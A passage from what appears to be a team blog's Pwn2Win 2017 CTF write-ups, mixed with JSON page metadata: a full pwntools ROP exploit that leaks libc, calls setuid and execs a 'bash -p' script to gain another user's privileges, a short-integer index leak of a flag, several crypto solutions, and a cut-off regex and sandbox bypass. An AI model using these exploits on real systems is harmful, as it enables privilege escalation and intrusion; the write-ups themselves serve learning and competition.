0x7fd320f7fd17[*] Switching to interactive modeNice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@$iduid=1001(wrong-user) gid=1001(wrong-user) groups=1001(wrong-user)$ cd home$ lscasemollyubuntuwrong-user$ cd molly$ lsflag.txtwrong$ cat flag.txtcat: flag.txt: Permission denied$ ls -ltatotal 13drwxr-xr-x 6 root root 6 Oct 21 10:25 ..drwxr-xr-x 2 root molly 7 Aug 31 22:37 .-rw-r----- 1 molly molly 29 Aug 31 22:37 flag.txt-rwsr-x--- 1 molly wrong-user 7704 Aug 31 22:27 wrong-rw-r--r-- 1 root molly 220 Aug 31 22:24 .bash_logout-rw-r--r-- 1 root molly 3771 Aug 31 22:24 .bashrc-rw-r--r-- 1 root molly 655 Aug 31 22:24 .profile So what’s wrong here? We don’t have access to the flag.txt, and happens we got access to the wrong user, there are some problems here, one of them is that in the beginning of the program we can see it’s being run setuid(getuid()) : This will drop permissions from the as we can see when we did ls -lta the executable has the setuid enabled:1-rwsr-x--- 1 molly wrong-user 7704 Aug 31 22:27 wrong Translating this a little bit:12345678910111213OWNER: Group-rws r-x ||||---&gt; Execute and setuid bit (both enabled). ||||||---&gt; Write Permissions(enabled) || \\--&gt; Executable permissions (Enabled)| \\---&gt; Read permissions(enabled) | \\--&gt; Write Permissions (Disabled) \\---&gt; If it&apos;s a directory(disabled) \\---&gt; Read Permissions (Enabled)World:---||||| \\---&gt; Executable permissions (Disabled)| \\---&gt; Write Permissions (Disabled) \\---&gt; Read Permissions (Disabled) When the setuid is enabled the process will run with owner permissions, but there are some issues that are dropping privileges, the setuid(getuid()) is one of them this is simple to solve we just need to create a ropchain that calls setuid(molly_uid) first we need to find molly’s uid this is easy we can check /etc/passwd : 1234567891011121314151617181920212223242526272829303132333435$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/falsesyslog:x:104:108::/home/syslog:/bin/false_apt:x:105:65534::/nonexistent:/bin/falselxd:x:106:65534::/var/lib/lxd/:/bin/falsemessagebus:x:107:111::/var/run/dbus:/bin/falseuuidd:x:108:112::/run/uuidd:/bin/falsednsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/falsesshd:x:110:65534::/var/run/sshd:/usr/sbin/nologinpollinate:x:111:1::/var/cache/pollinate:/bin/falseubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bashwrong-user:x:1001:1001:,,,:/home/wrong-user:/bin/bashmolly:x:1337:1337:,,,:/home/molly:/bin/bashcase:x:1002:1002:,,,:/home/case:/bin/bash Molly’s uid is 1337 writing a ropchain is trivial, we can do it like this: 12345SETUID = LIBCBASE + libc.symbols['setuid']ropchain += p64(POPRET) # POP RDI RETropchain += p64(1337) # 1337 ARG[1]ropchain += p64(SETUID) # SETUID function \"call\" Now we ran into another problem, system will drop privileges we need to use an alternative exec is perfect for this, but we can’t just do execv(‘/bin/bash’,0x0) if we read the man documentation of /bin/bash : The explanation from man pages is very clear, we need to provide -p as an argument to /bin/bash, we could do it with a ROPCHAIN but is harder to to find the right gadgets to put more than 1 arguments, since we have local access to the server we can just write a file into /tmp/exp and then execute it with execv(“/tmp/exp”,0x0): 12#!/bin/bash -p/bin/bash -p I had some problems to use vim and nano (python interactive shell didn’t work very well with them), so I had to write to script in my machine and convert it into base64, then using echo I wrote the file and decoded it into /tmp/exp: My machine 12345$ cat shell #!/bin/bash -p/bin/bash -p$ cat shell | base64IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg== Server’s machine 12345$ echo 'IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg==' | base64 -d#!/bin/bash -p/bin/bash -p$ echo 'IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg==' | base64 -d &gt; /tmp/exp$ chmod +x /tmp/exp Now we just need to build a ropchain that runs execv(‘/tmp/exp’, 0x0) we can’t use something like we use to system we need the address where /tmp/exp is stored, the trick here is to put this string on the stack and get it’s address from the register RSP, we need to find a gadget like this: 12MOV RDI, RSP CALL RAX First we need to store the address from execv into RAX, and we need to put the string /tmp/exp into the stack, so when we MOV RDI, RSP, we are going to move the address of the the string into RDI and then CALL RAX. These special gadget is not found in ./wrong binary we actually needed to search it in the libc binary itself! you can use RopGadgets to do it: We can build an ropchain that does that like this:1234567MOVCALL_OFFSET = 0x12b845POPRET_OFFSET = 0x33544ropchain += p64(LIBCBASE + POPRET_OFFSET) # POP RAX; RETropchain += p64(EXECV) # \"exec\"ropchain += p64(LIBCBASE + MOVCALL_OFFSET) # MOV RDI, RSP; CALL RAXropchain += \"/tmp/exp\\x00\" The full exploit is: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *import timedef getConn(): return process('./wrong', env = &#123;\"LD_PRELOAD\":'./libc.so.6'&#125;) if local else remote('10.133.70.1', 6666)local = Falser = getConn() BINSH_OFFSET = 0x18cd17 # strings -a -t x libc.so.6 | grep '/bin/sh'binary = ELF('./wrong')libc = ELF('./libc.so.6')PADDING = 'A'*40POPRET = 0x4007f3POPRET2 = 0x4007f1POPRET3 = 0x00000000004007f1PUTSPLT = binary.plt['puts'] #0x000000000040056cPUTSGOT = binary.got['puts']MAIN = 0x4006e6ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\" print r.recvuntil('Hello! What is your name?\\n')r.sendline(PADDING+ropchain)print r.recv(len('Nice to meet you ')+len(PADDING)+3)PUTS = u64(r.recv(6).ljust(8, '\\x00'))print r.recvuntil('Hello! What is your name?\\n')LIBCBASE = PUTS-libc.symbols['puts']BINSH = LIBCBASE + BINSH_OFFSETEXECV = LIBCBASE + libc.symbols['execv']SETUID = LIBCBASE + libc.symbols['setuid']log.info(\"LEAKED PUTS LIBC 0x%x\" % PUTS)log.info(\"EXECV LIBC 0x%x\" % EXECV)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH)log.info(\"SETUID ADDRESS 0x%x\" % SETUID)MOVCALL_OFFSET = 0x12b845POPRET_OFFSET = 0x33544ropchain = ''ropchain += p64(POPRET) # POP RDI RETropchain += p64(1337) # 1337 ARG[1]ropchain += p64(SETUID) # SETUID function \"call\"ropchain += p64(LIBCBASE + POPRET_OFFSET) # POP RAX; RETropchain += p64(EXECV) # \"exec\"ropchain += p64(LIBCBASE + MOVCALL_OFFSET) # MOV RDI RSP; CALL RAXropchain += \"/tmp/exp\\x00\" ropchain += p64(MAIN) # SYSTEM function \"call\"r.sendline(PADDING+ropchain)r.interactive() Now if we run it we can see we got the euid from molly and because of that we can read the flag.txt : 123456$iduid=1001(wrong-user) gid=1001(wrong-user) euid=1337(molly) groups=1001(wrong-user)$ ls /home/molly/flag.txt/home/molly/flag.txt$ cat /home/molly/flag.txtCTF-BR&#123;!!two_steps_pwnage!!&#125; I want to thank the organizers of this CTF for letting me getting access to the VPN to finish this challenge.","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"ret2libc","slug":"ret2libc","permalink":"https://teamrocketist.github.io/tags/ret2libc/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"}]},{"title":"[Pwn] Pwn2Win - Hidden Program (Warmup)","slug":"Pwn-Pwn2Win-Hidden-Program-Warmup","date":"2017-10-22T20:42:32.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/10/22/Pwn-Pwn2Win-Hidden-Program-Warmup/","link":"","permalink":"https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Hidden-Program-Warmup/","excerpt":"","text":"Hidden Program (Warmup)Molly found this program hidden on her chip, can you help her to understand it?Link:https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gzMirror:https://static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gzServer: nc 200.136.213.126 1988Id: hidden_programTotal solves: 145Score: 82Categories: Exploitation After extracting we have a .c file: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;limits.h&gt;#include &lt;string.h&gt;typedef struct&#123; char flag[SHRT_MAX+1]; char in[SHRT_MAX+1]; char sub[SHRT_MAX+1]; int n;&#125; player;player p1;void main()&#123; FILE *fp = fopen(\"/home/user/ctf/flag\",\"r\"); memset(p1.flag,0,sizeof(p1.flag)); fscanf(fp,\"%[^\\n]\",p1.flag); fclose(fp); printf(\"%s\\n\", p1.in); while(1) &#123; printf(\"Insert a short integer: \"); fflush(stdout); scanf(\" %d\", &amp;p1.n); if(p1.n&gt;SHRT_MAX) printf(\"Invalid number\\n\\n\"); else break; &#125; p1.n = (short)abs((short)p1.n); printf(\"Insert a string: \"); fflush(stdout); scanf(\"%10000s\",p1.in); printf(\"Insert another string: \"); fflush(stdout); scanf(\"%10000s\",p1.sub); if(strcmp(&amp;p1.in[p1.n],p1.sub)==0) printf(\"Congratulations!! YOU WIN!!\\n\"); else printf(\"\\tYou lost!!!\\n\\ In the string %s the substring in the position %d is %s\\n\\ Try again...\\n\", p1.in, p1.n, &amp;p1.in[p1.n]); fflush(stdout);&#125; Resuming what this program is doing, first it opens the flag file from the server and stores it in the c struct field p1.flag:1234FILE *fp = fopen(\"/home/user/ctf/flag\",\"r\");memset(p1.flag,0,sizeof(p1.flag));fscanf(fp,\"%[^\\n]\",p1.flag);fclose(fp); Then reads from the stdin using scanf for a short int (stores it in p1.n= and two strings (stores them in p1.in and p1.sub). 123456789101112131415while(1) &#123; printf(\"Insert a short integer: \"); fflush(stdout); scanf(\" %d\", &amp;p1.n); if(p1.n&gt;SHRT_MAX) printf(\"Invalid number\\n\\n\"); else break; &#125;p1.n = (short)abs((short)p1.n);printf(\"Insert a string: \");fflush(stdout);scanf(\"%10000s\",p1.in);printf(\"Insert another string: \");fflush(stdout);scanf(\"%10000s\",p1.sub); In the end we have this check: 123456if(strcmp(&amp;p1.in[p1.n],p1.sub)==0) printf(\"Congratulations!! YOU WIN!!\\n\");else printf(\"\\tYou lost!!!\\n\\ In the string %s the substring in the position %d is %s\\n\\ Try again...\\n\", p1.in, p1.n, &amp;p1.in[p1.n]); Well the strcmp does a compares between p1.n[p1.n] character and the string p1.sub, if they are equal it prints out the string “Congratulations!! YOU WIN!!\\n”, well we can see that making strcmp matching this will lead to nothing just a useless string, what we are interested what comes after else… Since we can control the index with p1.n, we can actually make this printf to print the flag which is p1.flag we just need to get the offset between p1.in and p1.flag we can get this easily with gdb: First lets compile the file with gcc: 1234$ gcc hiddenprogram.c -ggdb -o lol hiddenprogram.c: In function ‘main’:hiddenprogram.c:31:19: warning: implicit declaration of function ‘abs’ [-Wimplicit-function-declaration] p1.n = (short)abs((short)p1.n); The –gdb is very useful gives us alot of debugging information with gdb, we can view where we are located in the source code, breakpoints indicating the line numbers and even print variables by just using its names much easier than looking at assembly and print using addresses right? After using gdb we know where each variable from the struct begins doing a simple subtraction we can get the offset we need to print the flag: 12$ python -c \"print 0x5555557550a0-0x55555575d0a0\"-32768 The real problem in all this is that we need a negative value, and there is a ABS function making us fail: 1p1.n = (short)abs((short)p1.n); For some reason actually after the negative number when &gt;= -32768 the abs won’t do anything (I don’t really know why maybe its because the short cast? but if you know why this happens please tweet me or make a post in the comments)! this is perfect that’s what we really needed, you can see how the abs is doing with this program: 12345678#include&lt;stdio.h&gt;int main() &#123; int below=(short)abs((short)-32767); int value_we_need=(short)abs((short)-32768); int higher=(short)abs((short)-32769); printf(\"%d %d %d\\n\", below,value_we_need,higher);&#125; Running it:1234567$ gcc wtf.c -o wtfwtf.c: In function ‘main’:wtf.c:4:21: warning: implicit declaration of function ‘abs’ [-Wimplicit-function-declaration] int below=(short)abs((short)-32767); ^~~$ ./wtf 32767 -32768 32767 Now applying this with the service we get the flag by injection -32768: 12345678nc 200.136.213.126 1988 Insert a short integer: -32768Insert a string: 11Insert another string: 1 You lost!!! In the string 1 the substring in the position -32768 is CTF-BR&#123;Th1s_1S_4_50_5Imp13_C_exp1017_&#125; Try again...","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Integer Overflow","slug":"Pwn/x64/Integer-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Integer-Overflow/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"index","slug":"index","permalink":"https://teamrocketist.github.io/tags/index/"},{"name":"pwn2winctf","slug":"pwn2winctf","permalink":"https://teamrocketist.github.io/tags/pwn2winctf/"}]},{"title":"Crypto-Pwn2Win-2017-Asymmetric-Encryption","slug":"Crypto-Pwn2Win-2017-Asymmetric-Encryption","date":"2017-10-22T20:07:58.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/10/22/Crypto-Pwn2Win-2017-Asymmetric-Encryption/","link":"","permalink":"https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Asymmetric-Encryption/","excerpt":"","text":"Asymmetric EncryptionBloodsuckers use different asymmetric encryption algorithms to send messages to their partners. You may be able to exploit such communications, but first you should be able to recognize the used asymmetric algorithms.Server: nc 200.136.213.110 7777 We fire netcat and we obtain the following: 12345q = 896922063827g = 12424931089h = 574559267769enc(a) = (453104394915, 390471080026)enc(3*a + 32)? We notice that the cryptosystem here must be ElGamal.One can obtain the encryption of 3a, because ElGamal is homomorphic in relation to the multiplication, i.e. E(m1)E(m2) = E(m1*m2). But, it is not in relation to the addition. Therefore, it is required to find the private key x such that g^x mod q = h. As the prime q only has 40 bits, it is easy to find out with the baby step giant step meet in the middle attack.We used https://github.com/viralpoetry/Baby-step-giant-step to compute the discrete log. We obtain x = 202922528794. 1234567891011121314151617&gt;&gt;&gt; x = 202922528794&gt;&gt;&gt; q = 896922063827&gt;&gt;&gt; h = 574559267769&gt;&gt;&gt; g = 12424931089# we have now to find a&gt;&gt;&gt; enc = (453104394915, 390471080026)&gt;&gt;&gt; s = pow(enc[0], x, q)&gt;&gt;&gt; sinv = modinv(s, q)# (modinv from https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python)&gt;&gt;&gt; a = enc[1] * sinv % q&gt;&gt;&gt; a108768066438L&gt;&gt;&gt; to_encrypt = 3*a + 32&gt;&gt;&gt; r = 5 # we chose a small random number for the encryption. it could be whatever you wanted &lt; q&gt;&gt;&gt; result = (pow(g, r, q), to_encrypt * pow(h, r, q) % q)&gt;&gt;&gt; result(801172058328L, 410122112192L) Easy. We have our first correct answer. 1234567891011q = 896922063827g = 12424931089h = 574559267769enc(a) = (453104394915, 390471080026)enc(3*a + 32)?(801172058328, 410122112192)Correct! Next...n = 659381354716006369742363e = 65537enc(a) = 554863447144015806910906enc(a^5 + 2*a + 41)? Now, this is clearly RSA. The modulus is small. Let’s use yafu to compute the factors of 659381354716006369742363.We obtain p = 864367132729 and q = 762848712947. 12345678910&gt;&gt;&gt; p = 864367132729&gt;&gt;&gt; q = 762848712947&gt;&gt;&gt; n = p * q&gt;&gt;&gt; e = 65537&gt;&gt;&gt; d = modinv(e, (p-1)*(q-1))&gt;&gt;&gt; a = pow(554863447144015806910906, d, n)&gt;&gt;&gt; a218624962707346537869456L&gt;&gt;&gt; pow(a**5 + 2*a + 41, e, n)215275919603710085695724L We have our second answer correct. 12345678910n = 659381354716006369742363e = 65537enc(a) = 554863447144015806910906enc(a^5 + 2*a + 41)?215275919603710085695724Correct! Next...n = 776738987646974637425039g = 776738987646974637425040enc(a) = 104466234975614190334351556746005105225005455760enc(a^5)? Now, this looks like Paillier cryptosystem. We used yafu to discover n = p * q. We obtain p = 952658582963 and q = 815338256053. 1234567891011121314151617&gt;&gt;&gt; p = 952658582963&gt;&gt;&gt; q = 815338256053&gt;&gt;&gt; n = p * q&gt;&gt;&gt; g = 776738987646974637425040&gt;&gt;&gt; enc = 104466234975614190334351556746005105225005455760&gt;&gt;&gt; phi = (p-1)*(q-1)&gt;&gt;&gt; miu = modinv((pow(g, phi, n**2)-1)/n, n)# decrypt and find a&gt;&gt;&gt; z = pow(enc, phi, n**2)&gt;&gt;&gt; z = (z - 1)/n&gt;&gt;&gt; a = z*miu % n&gt;&gt;&gt; a593865001407021231568482L# encrypt a^5&gt;&gt;&gt; r = 5 #whatever number&gt;&gt;&gt; (pow(g, a**5, n**2) * pow(r, n, n**2)) % (n**2)551344609697032782258820295222867131320370770770L Correct. Next we find again ElGamal. 1234567891011n = 776738987646974637425039g = 776738987646974637425040enc(a) = 104466234975614190334351556746005105225005455760enc(a^5)?551344609697032782258820295222867131320370770770Correct! Next...q = 162468360679141142763506469479039044723348598131343445023537528281758038856725899813448600764965664562827243890486154155054547681581530078506256454819062823302171522262160978639320056038295558351438333626355253455829930861656788077110705347484186791527605530619097928023950578487542852122604132414043739150119g = 71617122044994067303905663362038925673552248437100144808168324877801061768171815833721974961532703253044394601768959631644002378569370957141698573753120813269172546820898334296643254497348710964283337196775523365259211998702039022625622498418357561295233596431521761773785941196196533383471457791068304542860h = 111066648693171887028924716387930536202901514118903026147266454463707523131763918297711469710662207420385870870164685517351171893585068487655691524361140991885848958718360460992751593253073812391597394918180851967495018510187596343611325247877606623904208279091478507563768905318293335621925954116646006910388enc(a) = (21624535586567506603984186779885207318602579759808112698630259017417529498649485922951645341096345328763025063786609897082667076531258136422106222993285575007280223388512289362685146566945916187517382905780252904425034481330835615708515857702294263742141184959896884068790745261235435155068299465225574582560, 38537941029975848030592009789690349376115082020053275876066791343139798710924237464927608815778845257515757255006036413842443376625286738601962899180988337782103893434680014360059921519888813156293982852260141731565853893416439570684816679875490888188370627554793241614773190030997959436875113067106880655048)enc(a^7)? This one is easy. The ElGamal encryption of a is the following. 1E(a) = (g^r mod q, a * h^r mod q) To obtain the encryption of a^7, we elevate E(a) to the power of 7. 1E(a)^7 = ((g^r mod q)^7, (a * h^r mod q)^7) = (g^(7r) mod q, a^7 * h^(7r) mod q) = E(a^7) Therefore: 123456...define q, h, g...&gt;&gt;&gt; enc = (21624535586567506603984186779885207318602579759808112698630259017417529498649485922951645341096345328763025063786609897082667076531258136422106222993285575007280223388512289362685146566945916187517382905780252904425034481330835615708515857702294263742141184959896884068790745261235435155068299465225574582560, 38537941029975848030592009789690349376115082020053275876066791343139798710924237464927608815778845257515757255006036413842443376625286738601962899180988337782103893434680014360059921519888813156293982852260141731565853893416439570684816679875490888188370627554793241614773190030997959436875113067106880655048)&gt;&gt;&gt; (pow(enc[0], 7, q), pow(enc[1], 7, q))(111943704492198613677284064414263835827314903408795497288196730523366749172531261312939368180540744924661825776170153157857298436145855968660805139686412343878802804331392369688765040244903208295888020856843171734022924414044150587927040617364297225555547079482268117880403242431146502775006475807941590243957, 146944962972196061304452302982428886923580067615704091332968984386866821167820106942309825648793805501664148988040753726356825992452196561280275962919553230491290426455421904803150216668843887712124953140424115672066452860798980586595286092420270643236030879120858647424877506090672990669173730588282484181475) Correct. The next one is another RSA with the following parameters. 1234n = 116129573369269565162236051660667188158855673329540427297390499575862981989835841843866583577063083766954029063144621040623764875768299287457499920694511048949688694670794953791035923764107936680805021705444041635396218234076099965276137996734996446529395542124683260815237555361324912425749295153953132095761e = 65537enc(a) = 113404819639317667150945206046179254025822100958261129257002960505190359188994098567188808686386964857225447271200495440587539103432162087685650112552863460383570740714408941280241382042752738643406032354358166194009200674868816147437559543328518217678994594982357470461665835857915008170677398859755267093420enc((31*a)^7)? RSA is homomorphic to the multiplication and powers. Just do the following. Encrypt 31. Multiply the encryption of 31 to the encryption of a. (z = E(31) * E(a) % n) Power it. (result = pow(z, 7, n)) Done. result is 79422070142774248998696748364536969928051026241019028333521995212847190464228596819898318295431833653185507986566295081274239311469462993984644730127173443271940560058698451295020485382667406426759092058704807263661852917928725084340240033097368645878075171977767675641790645116925564507723204703462264972052 Next. Another Paillier. 12345n = 8621606345813741778522514266054273377220780538934639795782688699674225088206322295464704691574306739432963387326203941438845912627154353843605597106654023g = 8621606345813741778522514266054273377220780538934639795782688699674225088206322295464704691574306739432963387326203941438845912627154353843605597106654024enc(a) = 7937660128690175325568344972823559278861468103813145508603245376730524355646304917359508580566100608589042820651231838238609822717639617861887063282742304194177278580800908754694218555803321746479637321316698926171902620676195782762387943008573984077258721183694556844093549693467565523559928218327284235089enc(b) = 33387753148071257428905539518160221978694704069687353836469091655010096223312256529016397591008817430414577588510555623557614906758093969392417915817764626568693773437705685363505728318306424617495507184665856273528630405473435911817059436953757079883134497707484413544554359132244534862297762773379557525426enc(31*a + 12*b + 56)? Pallier is homomorphic to the addition and the multiplication, in the following way: 12E(m1)^k = E(k*m1)E(m1)E(m2) = E(m1 + m2) The result is:1(pow(E(a),31,n**2) * pow(E(b), 12, n**2)) * E(56) % n**2 = 4970421455367244845374713137266537502697958490590659650451726192347671487410827360664416249739491204023927184480151500339026488270807023596092868579949981952165240250817692006905532570205653975588657894036033054920661457321178863796257037956921744588997061459597410104137746663293674207917309975395301044061 Finally, the flag is given to us:CTF-BR{ASym3tric_partially_Homomorphic_3ncryPt1on}","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://teamrocketist.github.io/tags/RSA/"},{"name":"elgamal","slug":"elgamal","permalink":"https://teamrocketist.github.io/tags/elgamal/"},{"name":"pallier","slug":"pallier","permalink":"https://teamrocketist.github.io/tags/pallier/"},{"name":"discrete log","slug":"discrete-log","permalink":"https://teamrocketist.github.io/tags/discrete-log/"}]},{"title":"Crypto-Pwn2Win-2017-Differential-Privacy","slug":"Crypto-Pwn2Win-2017-Differential-Privacy","date":"2017-10-22T18:59:47.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/","link":"","permalink":"https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/","excerpt":"","text":"Differential PrivacyIs it possible to have privacy on these days? The Rebelious Fingers do not think so. Get the flag.Server: nc 200.136.213.143 9999 We accessed the service and we try to get the info. 123456789Hello, chose an option:[1] Info[2] Query the flag (in ASCII)[3] Quit1You can query the flag, but the characters are private (indistinguishable).Differential privacy mechanism: LaplaceSensitivity: ||125 - 45|| = 80Epsilon: 6.5 From this information we know that maybe the service is using a differential privacy mechanism to hide the flag. We also know that the mechanism is “Laplace”.After a little research, we found the explanation of the differential privacy mechanism using the Laplace distribution. In this mechanism, the original value is added to a random value that obeys the Laplace distribution. This random value from the Laplace distribution is called laplace noise.The specific laplace distribution used in differential privacy is Laplace(0, sensitivity/epsilon). For more information on the Laplace distribution follow https://en.wikipedia.org/wiki/Laplace_distribution. 1anonymized = original + random_from_laplace We query the flag and obtain: 123456Hello, chose an option:[1] Info[2] Query the flag (in ASCII)[3] Quit2[75, 86, 83, 36, 56, 87, 146, 54, 97, 118, 110, 132, 101, 118, 120, 118, 112, 91, 103, 88, 140, 112, 110, 112, 120, 64, 95, 73, 97, 96, 114, 98, 113, 112, 113, 110, 118] So, maybe, the service is adding laplace noise to the ASCII values (integer) of the flag. If we query again, the values are different: 123456Hello, chose an option:[1] Info[2] Query the flag (in ASCII)[3] Quit2[64, 82, 67, 35, 71, 82, 118, 74, 95, 128, 98, 92, 108, 102, 123, 107, 94, 99, 103, 78, 102, 98, 111, 101, 114, 113, 111, 135, 97, 74, 92, 107, 93, 114, 111, 90, 128] We know that Laplace(0, sensitivity/epsilon) has average 0. So, if we average sufficient anonymized records of the flag, the random noise added will be canceled (because the average of the Laplace is 0), and the original value of the flag is obtained. So, the trick here is to query the flag plenty of times (we queried 10000 times) and average each entry. Here is sample code: from pwn import * def get_list(): r = remote('200.136.213.143', 9999) r.recvline() r.recvline() r.recvline() r.recvline() r.send(\"2\\n\") return eval(r.recvline()) d = [] for i in range(37): d.append(list()) for i in range(10000): if i % 10 == 0: print i l = get_list() for j in range(len(l)): d[j].append(l[j]) for i in range(37): av = sum(d[i]) / len(d[i]) result.append(int(round(av))) print result print \"\".join([chr(c) for c in result]) At the end, we obtain the flag: CTF-BR{I_am_just_filtering_the_noise} EDIT: bug in the source code. Thank you LFChang.","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"laplace","slug":"laplace","permalink":"https://teamrocketist.github.io/tags/laplace/"},{"name":"differential","slug":"differential","permalink":"https://teamrocketist.github.io/tags/differential/"}]},{"title":"[Pwn] Pwn2Win - Tokens v2.0","slug":"Pwn-Pwn2Win-Tokens-v2-0","date":"2017-10-22T17:47:30.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/10/22/Pwn-Pwn2Win-Tokens-v2-0/","link":"","permalink":"https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Tokens-v2-0/","excerpt":"","text":"Tokens v2.0We have discovered that the upper echelon of Butcher Corp. uses a temporary token generator along with their brain chips as a form of 2FA(Two-Factor Authentication) for their most restricted systems. Our intel team got their source code, but we still haven’t got the seed right. We need you to get it for us, as we’re sure it will be useful for other systems! The name of one of this system’s users is “Dúfa van Tryggvadóttir”, vice president of the company.Source Code:LinkMirrorServer: nc 200.136.213.114 4000Id: tokens_v20Total solves: 22Score: 283Categories: Exploitation This exploitation challenge is about this python script:https://pastebin.com/144yVeZF This challenge has 3 steps to be solved: 1231 - Find a regex that matches &quot;Dúfa van Tryggvadóttir&quot; with some restrictions.2 - Bypass de options checks and run gen function.3 - Bypass the Sand box and print the seed (Which was the flag). Find a regex that matches “Dúfa van Tryggvadóttir” with some restrictions.This is easy even with these restrictions: 1234567limit = 22if len(regex) &gt; limit: print \"What kind of name is yours?\" exit() tmp = re.findall(\"[^A-z+]\", regex)tmp1 = re.findall(\"[\\[\\]]\", regex) The first regex matches every single character not present in the list below [^A-z+]: A-z a single character in the range between A (index _65_) and z (index 122) (case sensitive) + matches the character + literally (case sensitive) The second regex matches every single character present in the list below [\\[\\]]: [ matches the character [ literally (case sensitive) ] matches the character ] literally (case sensitive) So we can use characters from index _65_ to index 122 any others outside this range is forbidden(consult http://www.asciitable.com/index/asciifull.gif) and we can’t user [ or ] and a limit of 22 characters. Our aproach to this step was easy to find something that was equivalent to the . character, which in regex means matching any character except for new line, we have the + character. We used the following regex:If we test this in the binary we can see it worked!: 1234567891011$ nc 200.136.213.114 4000Hello! Log on to the Token Generation SystemIf your name is not on the authorized list, a notification will be generated!For security reasons, NEVER type your literal name.Type your regex-name to identify ([^\\[\\]][A-z+]): D\\D+rHello, Vice-President![Open] - To create a new token[Revoke] - To Revoke a tokenType the option: Bypass de options checks and run gen functionThis is the part of the code we need to analyse: 12345if role == \"President\" and \"Open\" in option or \"Revoke\" in option: authorized = 1else: print \"For now, only the president is allowed to generate tokens.\" exit() The first thing we have to do here is to choose Revoke, we don’t have the Presidents name so if we don’t want to exit the program, there will be a second check: 12345678910111213141516171819202122232425if authorized: print \"\\nFor security reasons, confirme your option!\" option = Option() option_test = re.findall('[\\w]+', option) for s in option_test: if s == \"Open\": print \"Mr. President, enable the option to generate tokens on the server.\" exit() elif s == \"Revoke\": token = raw_input(\"Type your token serial: 